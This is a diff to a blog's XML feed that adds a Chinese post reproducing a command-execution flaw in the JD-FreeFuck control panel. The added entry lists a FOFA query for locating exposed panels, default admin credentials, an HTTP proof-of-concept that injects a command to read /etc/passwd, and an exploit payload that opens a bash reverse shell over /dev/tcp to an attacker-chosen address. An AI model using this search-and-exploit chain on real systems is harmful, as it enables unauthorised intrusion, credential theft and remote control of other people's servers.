@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>漏洞复现-JDFreeFuck后台命令执行</title>
+      <link href="2021/04/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-JDFreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+      <url>2021/04/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-JDFreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一-介绍"><a href="#一-介绍" class="headerlink" title="一:介绍"></a>一:介绍</h1><blockquote><p>JD-FreeFuck用途：通过<strong>自动化脚本</strong>参与JD商城的各种活动从而获取京豆用于购物抵扣，还可通过某些活动免费领取商品或现金红包。</p></blockquote><table><thead><tr><th>适用安装平台</th><th>使用搭建环境</th></tr></thead><tbody><tr><td>PC/VPS (虚拟专用服务器) /NAS /软路由</td><td>GNU/Linux 或 Docker Server</td></tr></tbody></table><ul><li><a href="https://gitee.com/mjf521/JD-FreeFuck">文件源码</a></li></ul><h1 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二:漏洞利用"></a>二:漏洞利用</h1><h4 id="2-1FoFa搜索"><a href="#2-1FoFa搜索" class="headerlink" title="2.1FoFa搜索"></a>2.1FoFa搜索</h4><pre><code class="shell">title="京东薅羊毛控制面板"</code></pre><h4 id="2-2默认账号密码"><a href="#2-2默认账号密码" class="headerlink" title="2.2默认账号密码"></a>2.2默认账号密码</h4><pre><code class="shell">useradmin/supermanito</code></pre><h4 id="2-3后台验证地址"><a href="#2-3后台验证地址" class="headerlink" title="2.3后台验证地址"></a>2.3后台验证地址</h4><p>点击以下的位置并开启BP抓包拦截…</p><p><img src="https://z3.ax1x.com/2021/04/07/c3zCwD.png"></p><h4 id="2-4POC"><a href="#2-4POC" class="headerlink" title="2.4POC"></a>2.4POC</h4><pre><code class="http">POST /runCmd HTTP/1.1Host: 6.6.6.6:5678User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 36Origin: http://6.6.6.6:5678Connection: closeReferer: http://6.6.6.6:5678/runCookie: connect.0.2909947918704856=s%3AP5Hz-NC0kr_ic7Mg-Ks2AYb7wE9MXFTI.nNvr42WrVQ3NQZEK%2FO18m6vrTfG4I%2BuLgzcKrwywBQgcmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&amp;delay=500</code></pre><h4 id="2-5EXP"><a href="#2-5EXP" class="headerlink" title="2.5EXP"></a>2.5EXP</h4><pre><code class="http">cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F【IP地址】%2F【端口】+%3C%261'%3B+now&amp;delay=500</code></pre><h4 id="2-6shell反弹"><a href="#2-6shell反弹" class="headerlink" title="2.6shell反弹"></a>2.6shell反弹</h4><p><img src="https://z3.ax1x.com/2021/04/07/c8SFBT.png"></p><h1 id="三-批量脚本"><a href="#三-批量脚本" class="headerlink" title="三:批量脚本"></a>三:批量脚本</h1><p>…</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WEB渗透 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>黑客三字经</title>
       <link href="2021/04/06/%E9%BB%91%E5%AE%A2%E4%B8%89%E5%AD%97%E7%BB%8F/"/>
       <url>2021/04/06/%E9%BB%91%E5%AE%A2%E4%B8%89%E5%AD%97%E7%BB%8F/</url>
